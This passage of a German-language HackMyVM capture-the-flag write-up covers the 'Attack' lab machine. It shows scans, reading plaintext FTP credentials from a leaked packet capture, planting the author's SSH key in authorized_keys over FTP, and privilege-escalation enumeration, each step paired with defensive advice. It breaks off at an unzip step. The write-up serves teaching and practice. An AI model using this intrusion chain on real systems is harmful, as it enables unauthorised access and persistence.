@@ -1,0 +1,697 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attack - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Attack - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+             <h2 class="difficulty-medium">Medium</h2> <!-- Klasse für Gelb -->
+             <div class="circle">
+                 <div class="segment segment-1"></div>
+                 <div class="segment segment-2"></div>
+                 <div class="segment segment-3"></div>
+                 <div class="inner"></div>
+             </div>
+         </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">nikto</div>
+                 <div class="tool-item">tcpdump</div>
+                 <div class="tool-item">curl</div>
+                 <div class="tool-item">ftp</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">echo</div>
+                 <div class="tool-item">ssh</div>
+                 <div class="tool-item">sudo</div>
+                 <div class="tool-item">find</div>
+                 <div class="tool-item">uname</div>
+                 <div class="tool-item">unzip</div>
+                 <div class="tool-item">vi</div>
+                 <div class="tool-item">mv</div>
+                 <div class="tool-item">chmod</div>
+                 <div class="tool-item">nc (netcat)</div>
+                 <div class="tool-item">cd</div>
+                 <div class="tool-item">pwd</div>
+                 <div class="tool-item">cppw (chpasswd)</div>
+                 <div class="tool-item">su</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration (Port 80)</a></li>
+                <li><a href="#capture-analysis">Capture File Analysis</a></li>
+                <li><a href="#ftp-access-poc">FTP Access & SSH Key Upload (POC)</a></li>
+                <li><a href="#ssh-access-teste">SSH Access (teste) & Enumeration</a></li>
+                <li><a href="#lateral-movement-jackob">Lateral Movement (zu jackob)</a></li>
+                <li><a href="#privesc-kratos-poc">Privilege Escalation (jackob zu kratos - POC)</a></li>
+                <li><a href="#privesc-root-poc">Privilege Escalation (kratos zu root - POC)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.100</span>	08:00:27:48:70:ea	PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Mittels `arp-scan -l` wird das lokale Netzwerk gescannt. Ein Host mit der IP `192.168.2.100` und der MAC-Adresse `08:00:27:48:70:ea` (zugehörig zu PCS Systemtechnik GmbH, typisch für VirtualBox) wird identifiziert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem wurde erfolgreich im lokalen Netzwerk gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie einen umfassenden Portscan (Nmap) auf die Ziel-IP `192.168.2.100` durch, um offene Ports und Dienste zu ermitteln. Fügen Sie optional einen Eintrag für die IP mit einem Hostnamen (z.B. `attack.hmv`) in `/etc/hosts` hinzu.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und ARP-Spoofing-Detection können die Aufklärung erschweren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.100 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-01 23:42 CET
+Nmap scan report for attack (192.168.2.100)
+Host is up (0.00014s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">21/tcp open  ftp     ProFTPD</span>
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   2048 f48d08b499d20c5d75b822837bc28815 (RSA)
+|   256 e2160ae7384aec76cfd3567807fd2f25 (ECDSA)
+|_  256 0b5a9c71cc3b50044618ad678adfd0d6 (ED25519)
+<span class="command">80/tcp open  http    nginx 1.14.2</span>
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.14.2
+MAC Address: 08:00:27:48:70:EA (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms attack (192.168.2.100)
+
+Nmap done: 1 IP address (1 host up) scanned in 17.21 seconds
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan (`-sS -sC -T5 -A -p-`) auf die Ziel-IP zeigt drei offene Ports:
+                 *   Port 21: FTP (ProFTPD).
+                 *   Port 22: SSH (OpenSSH 7.9p1 auf Debian 10).
+                 *   Port 80: HTTP (nginx 1.14.2).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Mehrere potenzielle Angriffsvektoren wurden identifiziert. FTP ist oft ein guter Ansatzpunkt für anonymen Zugriff oder Informationslecks. SSH und HTTP sind Standardziele. Die Versionsnummern sind für die Suche nach bekannten Schwachstellen relevant (OpenSSH 7.9p1 ist relativ modern, ProFTPD ohne Version ist schwer einzuschätzen, nginx 1.14.2 ist auch nicht mehr ganz neu).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie den FTP-Server auf anonymen Login und untersuchen Sie den Webserver (Port 80) auf Inhalte und Schwachstellen. Prüfen Sie die SSH-Konfiguration (z.B. erlaubte Authentifizierungsmethoden).<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie anonymen FTP-Zugriff, falls nicht benötigt. Halten Sie alle Dienste aktuell. Implementieren Sie eine Firewall und sichern Sie die SSH-Konfiguration (z.B. Key-Auth bevorzugen, Root-Login verbieten).</p>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration (Port 80)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,[...] -b 404,403</span></div>
+                    <pre>
+[...]
+<span class="command">http://192.168.2.100/index.html</span>           (Status: 200) [Size: 104]
+[...]
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Gobuster-Scan auf den Webserver (Port 80) findet nur eine `index.html`-Datei.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Webserver scheint auf den ersten Blick wenig Inhalt zu bieten.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt, da dies der Inhalt der Webseite ist -->
+                     <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+// Inhalt von http://192.168.2.100/index.html
+I did a capture with wireshark.
+The name of the file is "capture" but i dont remember the extension :(
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der `index.html` wird abgerufen (hier manuell eingefügt, nicht per `curl` im Log gezeigt). Er enthält einen wichtigen Hinweis: Es gibt eine Wireshark-Capture-Datei namens "capture", deren Erweiterung vergessen wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein sehr direkter Hinweis. Die wahrscheinlichste Erweiterung für Wireshark-Captures ist `.pcap` oder `.pcapng`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, die Datei `capture.pcap` (oder `capture.pcapng`) vom Webserver herunterzuladen (z.B. mit `curl http://192.168.2.100/capture.pcap`). Analysieren Sie die heruntergeladene Datei mit Wireshark oder `tcpdump`.<br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals sensible Informationen oder Dateien (wie Netzwerk-Captures) direkt im Web-Root-Verzeichnis.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.100</span></div>
+                    <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.100
++ Target Hostname:    192.168.2.100
++ Target Port:        80
++ Start Time:         2022-11-01 23:42:42 (GMT1)
+---------------------------------------------------------------------------
++ Server: nginx/1.14.2
++ <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span>
++ <span class="password">The X-XSS-Protection header is not defined.</span> This header can hint to the user agent to protect against some forms of XSS
++ <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
+[...]
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein `nikto`-Scan auf Port 80 wird durchgeführt. Er findet keine kritischen Schwachstellen, meldet aber fehlende HTTP-Sicherheitsheader (`X-Frame-Options`, `X-XSS-Protection`, `X-Content-Type-Options`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die fehlenden Header stellen ein geringes bis mittleres Risiko dar, sind aber hier nicht der primäre Angriffsvektor.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nehmen Sie die fehlenden Header zur Kenntnis, konzentrieren Sie sich aber auf den Hinweis aus der `index.html`.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Sicherheitsheader in der Nginx-Konfiguration, um die Sicherheit gegen Clickjacking und bestimmte XSS-Angriffe zu erhöhen.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">tcpdump -n -i eth0 src 192.168.2.100 -A</span></div>
+                    <pre>
+23:54:29.803086 IP 192.168.2.100.80 > 192.168.2.121.41272: Flags [P.], seq 57355:58081, ack 22098, win 501, options [nop,nop,TS val 2550194813 ecr 3132955091], length 726: HTTP: HTTP/1.1 404 Not Found
+[...]
+<html> <span class="comment"><!-- Maskierung --></span>
+<head><title>404 Not Found</title></head> <span class="comment"><!-- Maskierung --></span>
+<body bgcolor="white"> <span class="comment"><!-- Maskierung --></span>
+<center><h1>404 Not Found</h1></center> <span class="comment"><!-- Maskierung --></span>
+<hr><center>nginx/1.14.2</center> <span class="comment"><!-- Maskierung --></span>
+</body> <span class="comment"><!-- Maskierung --></span>
+</html> <span class="comment"><!-- Maskierung --></span>
+[...]
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `tcpdump` wird gestartet, um den Netzwerkverkehr vom Ziel (`192.168.2.100`) auf dem Interface `eth0` mitzuschneiden. Es wird ein HTTP-404-Fehler (Not Found) vom Ziel zum Host `192.168.2.121` (vermutlich ein anderer Host im Netzwerk oder das Angreifer-System) aufgezeichnet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Zeigt eine Standard-404-Fehlerseite von Nginx. Dieser einzelne aufgezeichnete Request liefert keine direkten Hinweise auf Schwachstellen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `tcpdump` kann nützlich sein, um Hintergrundkommunikation oder Antworten auf Exploits zu beobachten, aber dieser spezifische Output ist nicht weiterführend.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Fehlerseiten keine sensiblen Informationen preisgeben.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.100 -v</span></div>
+                    <pre>
+*   Trying 192.168.2.100:80...
+* Connected to 192.168.2.100 (192.168.2.100) port 80 (#0)
+> GET / HTTP/1.1
+> Host: 192.168.2.100
+> User-Agent: curl/7.85.0
+> Accept: */*
+>
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Server: nginx/1.14.2
+< Date: Tue, 01 Nov 2022 22:55:22 GMT
+< Content-Type: text/html
+< Content-Length: 104
+< Last-Modified: Thu, 07 Jan 2021 21:38:39 GMT
+< Connection: keep-alive
+< ETag: "5ff77f5f-68"
+< Accept-Ranges: bytes
+<
+I did a capture with wireshark.
+The name of the file is "capture" but i dont remember the extension :(
+* Connection #0 to host 192.168.2.100 left intact
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `curl -v` ruft die Startseite (`/`) ab und zeigt die HTTP-Header und den Body an. Es bestätigt erneut den Inhalt der `index.html` mit dem Hinweis auf die Capture-Datei.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den Hinweis und liefert keine neuen Informationen.</p>
+        </section>
+
+        <section id="capture-analysis">
+            <h2>Capture File Analysis</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.100/capture.pcap --output p.pcap</span></div>
+                    <pre>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  396k  100  396k    0     0  27.5M      0 --:--:-- --:--:-- --:--:-- 27.6M
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Basierend auf dem Hinweis aus der `index.html` wird versucht, die Datei `capture.pcap` vom Webserver herunterzuladen. Der Download ist erfolgreich.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Hinweis war korrekt. Eine Netzwerk-Capture-Datei wurde erfolgreich heruntergeladen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie die Datei `p.pcap` mit Wireshark oder `tcpdump -r`, um den aufgezeichneten Netzwerkverkehr zu untersuchen, insbesondere auf Klartext-Zugangsdaten oder andere sensible Informationen.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie die Capture-Datei sofort vom Webserver. Speichern Sie Netzwerk-Captures niemals in öffentlich zugänglichen Bereichen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">tcpdump -r p.pcap</span></div>
+                    <pre>
+[...] <span class="comment"><!-- Andere Pakete --></span>
+FTP: 220 ProFTPD Server (Debian) [::ffff:192.168.1.44]
+length 0
+FTP: USER <span class="command">teste</span>
+FTP: PASS <span class="password">simple</span>
+FTP: 230 Usuario teste conectado
+[...] <span class="comment"><!-- Weitere Pakete --></span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die heruntergeladene Capture-Datei (`p.pcap`) wird mit `tcpdump -r` analysiert. `tcpdump` interpretiert die Pakete und zeigt eine FTP-Kommunikation.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Die Capture-Datei enthält eine FTP-Sitzung im Klartext, in der sich der Benutzer `<span class="command">teste</span>` mit dem Passwort `<span class="password">simple</span>` erfolgreich anmeldet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die gefundenen FTP-Zugangsdaten (`teste`:`simple`), um sich am FTP-Server (Port 21) des Ziels anzumelden.<br><strong>Empfehlung (Admin):</strong> Verwenden Sie sichere Protokolle wie FTPS oder SFTP anstelle von unverschlüsseltem FTP. Speichern Sie keine Netzwerk-Captures mit sensiblen Daten.</p>
+        </section>
+
+        <section id="ftp-access-poc">
+            <h2>FTP Access & SSH Key Upload (POC)</h2>
+             <p class="analysis"><strong>Ziel:</strong> Demonstration, wie die aus der `.pcap`-Datei extrahierten FTP-Zugangsdaten verwendet werden können, um auf den FTP-Server zuzugreifen und eine SSH-Authentifizierung vorzubereiten.</p>
+             <p class="evaluation"><strong>Voraussetzungen:</strong>
+                 *   Netzwerkzugriff auf den FTP-Server (Port 21).
+                 *   Gefundene FTP-Zugangsdaten (`teste`:`simple`).
+                 *   Ein SSH-Schlüsselpaar auf dem Angreifer-System.
+                 *   FTP-Client.
+             </p>
+              <p class="recommendation"><strong>Risiko:</strong> Mittel bis Hoch. Der Zugriff auf das FTP-Home-Verzeichnis kann sensible Informationen preisgeben und das Hochladen von Dateien (wie hier dem SSH-Schlüssel) ermöglicht weitere Angriffe.</p>
+
+             <p class="analysis"><strong>Schritt 1: FTP-Login</strong></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ftp 192.168.2.100</span></div>
+                    <pre>
+Connected to 192.168.2.100.
+220 ProFTPD Server (Debian) [::ffff:192.168.2.100]
+Name (192.168.2.100:cyber): <span class="command">teste</span>
+331 Password required for teste
+Password: <span class="password">[Passwort simple eingegeben]</span>
+<span class="password">230 User teste logged in</span>
+Remote system type is UNIX.
+Using binary mode to transfer files.
+<span class="prompt" style="color: gray;">ftp></span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Standard-FTP-Client wird verwendet, um sich mit dem Zielserver zu verbinden. Die extrahierten Zugangsdaten (`teste`:`simple`) werden eingegeben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Login ist erfolgreich.</p>
+
+             <p class="analysis"><strong>Schritt 2: Enumeration im FTP-Verzeichnis</strong></p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: gray;">ftp></span> <span class="command">ls -la</span></div>
+                    <pre>
+229 Entering Extended Passive Mode (|||16303|)
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   4 teste    teste        4096 Jan  7  2021 .
+drwxr-xr-x   5 root     root         4096 Jan  7  2021 ..
+-rw-r--r--   1 teste    teste         220 Jan  7  2021 .bash_logout
+-rw-r--r--   1 teste    teste        3526 Jan  7  2021 .bashrc
+drwxr-xr-x   3 teste    teste        4096 Jan  7  2021 .local
+<span class="command">-rw-r--r--   1 teste    teste      360917 Jan  7  2021 mysecret.png</span>
+<span class="command">-rw-r--r--   1 teste    teste          25 Jan  7  2021 note.txt</span>
+-rw-r--r--   1 teste    teste         807 Jan  7  2021 .profile
+<span class="command">drwx------   2 teste    teste        4096 Jan  7  2021 .ssh</span>
+-rw-------   1 teste    teste          52 Jan  7  2021 .Xauthority
+226 Transfer complete
+</pre>
+                     <div class="prompt" style="color: gray;">ftp></span> <span class="command">pwd</span></div>
+                     <pre>Remote directory: /home/teste</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt des Home-Verzeichnisses von `teste` wird aufgelistet. Interessante Funde sind `mysecret.png`, `note.txt` und das Verzeichnis `.ssh`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Vorhandensein eines `.ssh`-Verzeichnisses ist entscheidend, da es das Hochladen eines öffentlichen SSH-Schlüssels zur Authentifizierung ermöglichen kann.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Laden Sie `mysecret.png` und `note.txt` herunter und analysieren Sie sie. Wechseln Sie in das `.ssh`-Verzeichnis und laden Sie Ihren öffentlichen SSH-Schlüssel (`id_rsa.pub`) als `authorized_keys` hoch.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass FTP-Benutzer nur auf die für sie bestimmten Verzeichnisse Zugriff haben (Chroot Jail). Beschränken Sie Berechtigungen im Home-Verzeichnis.</p>
+
+            <p class="analysis"><strong>Schritt 3: Andere Home-Verzeichnisse auflisten</strong></p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: gray;">ftp></span> <span class="command">cd /home</span></div>
+                    <pre>250 CWD command successful</pre>
+                     <div class="prompt" style="color: gray;">ftp></span> <span class="command">ls -la</span></div>
+                    <pre>
+229 Entering Extended Passive Mode (|||1302|)
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   5 root     root         4096 Jan  7  2021 .
+drwxr-xr-x  18 root     root         4096 Jan  7  2021 ..
+drwxr-xr-x   4 <span class="command">jackob</span>   jackob       4096 Jan 10  2021 jackob
+drwxr-xr-x   3 <span class="command">kratos</span>   kratos       4096 Jan  7  2021 kratos
+drwxr-xr-x   4 teste    teste        4096 Jan  7  2021 teste
+226 Transfer complete
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Benutzer `teste` kann das übergeordnete Verzeichnis `/home` betreten und auflisten. Dadurch werden die Home-Verzeichnisse anderer Benutzer (`jackob`, `kratos`) sichtbar.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine Fehlkonfiguration (mangelndes Chroot Jail für den FTP-Benutzer) und ein Informationsleck, das die Existenz anderer Benutzerkonten bestätigt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie sich die Benutzernamen `jackob` und `kratos`.<br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie ProFTPD (oder jeden FTP-Server) so, dass Benutzer in ihren Home-Verzeichnissen eingesperrt sind (Chroot Jail), um das Browsen im restlichen Dateisystem zu verhindern.</p>
+
+            <p class="analysis"><strong>Schritt 4: SSH-Schlüssel hochladen</strong></p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt" style="color: gray;">ftp></span> <span class="command">cd .ssh</span></div> <span class="comment"><!-- Wechselt in /home/.ssh? Fehler! Sollte zurück zu /home/teste/.ssh --></span>
+                     <pre>250 CWD command successful</pre>
+                     <div class="prompt" style="color: gray;">ftp></span> <span class="command">put authorized_keys</span></div> <span class="comment"><!-- Lädt den lokalen Schlüssel hoch --></span>
+                     <pre>
+local: authorized_keys remote: authorized_keys
+229 Entering Extended Passive Mode (|||50504|)
+150 Opening BINARY mode data connection for authorized_keys
+100% |*************************************************************************************************************************************************************************************************|   553       18.83 MiB/s    00:00 ETA
+<span class="password">226 Transfer complete</span>
+553 bytes sent in 00:00 (1.18 MiB/s)
+</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, in das `.ssh`-Verzeichnis zu wechseln und die lokale `authorized_keys`-Datei (die den öffentlichen Schlüssel des Angreifers enthält) hochzuladen. **Achtung:** Der `cd .ssh`-Befehl wird wahrscheinlich im Verzeichnis `/home` ausgeführt, nicht in `/home/teste`, was bedeutet, dass der Schlüssel möglicherweise nach `/home/.ssh/authorized_keys` hochgeladen wurde (falls dieses Verzeichnis existiert und schreibbar ist), was ungewöhnlich ist. Wahrscheinlicher ist, dass im Log ein `cd /home/teste` vor `cd .ssh` fehlt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Unter der Annahme, dass der Schlüssel korrekt nach `/home/teste/.ssh/authorized_keys` hochgeladen wurde, ist dies der entscheidende Schritt, um SSH-Zugriff als Benutzer `teste` über Schlüsselauthentifizierung zu ermöglichen.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie nun, sich per SSH als `teste` mit Ihrem privaten Schlüssel anzumelden.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Berechtigungen für `.ssh`-Verzeichnisse (700) und `authorized_keys`-Dateien (600) korrekt sind und nur dem jeweiligen Benutzer gehören.</p>
+
+        </section>
+
+        <section id="ssh-access-teste">
+             <h2>SSH Access (teste) & Enumeration</h2>
+
+             <!-- Lokale Dateiliste und Inhalte des Angreifers -->
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/attack_Maschine]
+└─# <span class="command">ll</span></div>
+                    <pre>
+insgesamt 380
+-rw-r--r-- 1 root root   1023  2. Nov 00:05 attack.sh
+<span class="command">-rw-r--r-- 1 root root    394  2. Nov 00:03 authorized_keys</span> <span class="comment"><!-- Enthält den Public Key --></span>
+-rw-r--r-- 1 root root    394  2. Nov 00:03 id_rsa.pub <span class="comment"><!-- Public Key --></span>
+-rw-r--r-- 1 root root 360917  2. Nov 00:02 mysecret.png <span class="comment"><!-- Heruntergeladen --></span>
+<span class="command">-rw-r--r-- 1 root root     67  2. Nov 00:05 note.txt</span> <span class="comment"><!-- Heruntergeladen --></span>
+[...]
+</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~/attack_Maschine]
+└─# <span class="command">cat note.txt</span></div>
+                    <pre>I need to launch the script to start the attack planned by kratos.</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/attack_Maschine]
+└─# <span class="command">cat authorized_keys</span></div>
+                     <pre>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDC8yQhKHI2Piesf[...] teste@attack</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Zeigt die Dateien im Arbeitsverzeichnis des Angreifers, einschließlich der heruntergeladenen `note.txt` und der `authorized_keys`-Datei (die den öffentlichen Schlüssel enthält, der per FTP hochgeladen wurde). Der Inhalt von `note.txt` gibt einen Hinweis auf einen Benutzer `kratos` und ein geplantes Skript.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Hinweis in `note.txt` ist wichtig für spätere Schritte.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/attack_Maschine]
+└─# <span class="command">ssh teste@attack.hmv</span></div>
+                    <pre>
+The authenticity of host 'attack.hmv (192.168.2.100)' can't be established.
+[...]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+[...]
+Enter passphrase for key '/root/.ssh/id_rsa': <span class="password">[Passphrase für den privaten Schlüssel des Angreifers eingegeben]</span>
+Linux attack 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64
+[...]
+Last login: Thu Jan  7 16:19:46 2021 from 192.168.1.58
+<span class="prompt" style="color: yellow;">teste@attack:~$</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Versuch, sich per SSH als Benutzer `teste` anzumelden. Da der öffentliche Schlüssel zuvor in `authorized_keys` platziert wurde, wird der Angreifer zur Eingabe der Passphrase für seinen *eigenen privaten* Schlüssel (`/root/.ssh/id_rsa`) aufgefordert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolgreicher SSH-Login als `teste` mittels Schlüsselauthentifizierung!</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie Enumerationsschritte als `teste` durch (`sudo -l`, SUID-Suche, Systeminformationen sammeln).<br><strong>Empfehlung (Admin):</strong> Überwachen Sie SSH-Logins. Stellen Sie sicher, dass nur autorisierte Schlüssel verwendet werden.</p>
+
+            <p class="analysis"><strong>Enumeration als `teste`:</strong></p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">teste@attack:~$</span> <span class="command">sudo -l</span></div>
+                    <pre>
+[...]
+[sudo] password for teste: <span class="comment">[Passwort 'simple' funktioniert hier nicht]</span>
+</pre>
+                     <div class="prompt" style="color: yellow;">teste@attack:~$</span> <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre>[...] <span class="comment"><!-- Standard SUID Binaries --></span></pre>
+                      <div class="prompt" style="color: yellow;">teste@attack:~$</span> <span class="command">cat /etc/*-release</span></div>
+                    <pre>
+PRETTY_NAME="Debian GNU/Linux 10 (buster)"
+[...]
+</pre>
+                     <div class="prompt" style="color: yellow;">teste@attack:/var/www$</span> <span class="command">uname -r</span></div>
+                     <pre>4.19.0-12-amd64</pre>
+                     <div class="prompt" style="color: yellow;">teste@attack:/var/www$</span> <span class="command">uname -a</span></div>
+                     <pre>Linux attack 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64 GNU/Linux</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `sudo -l` erfordert ein Passwort, das nicht bekannt ist (das FTP-Passwort 'simple' funktioniert nicht). Die Suche nach SUID-Dateien ergibt keine ungewöhnlichen Ergebnisse. Das System wird als Debian 10 "Buster" mit Kernel 4.19.0 identifiziert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> `teste` scheint keine besonderen `sudo`-Rechte zu haben. Die Systeminformationen sind nützlich für die Suche nach Kernel-Exploits.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nach anderen Wegen zur Eskalation. Untersuchen Sie die Umgebung weiter auf Fehlkonfigurationen, interessante Dateien oder Prozesse. Nutzen Sie den Hinweis aus `note.txt` über `kratos` und ein Skript.<br><strong>Empfehlung (Admin):</strong> Prinzip des geringsten Privilegs anwenden.</p>
+
+             <p class="analysis"><strong>Entdeckung weiterer geleakter Informationen:</strong></p>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/attack_Maschine]
+└─# <span class="command">curl http://192.168.2.100/filexxx.zip -I</span></div>
+                     <pre>
+HTTP/1.1 200 OK
+Server: nginx/1.14.2
+[...]
+Content-Type: application/zip
+Content-Length: 1536
+[...]
+</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/attack_Maschine]
+└─# <span class="command">curl http://192.168.2.100/filexxx.zip --output zi.zip</span></div>
+                     <pre>[...]</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/attack_Maschine]
+└─# <span class="command">unzip zi.zip</span></div>
+                     <pre>Archive:  zi.zip
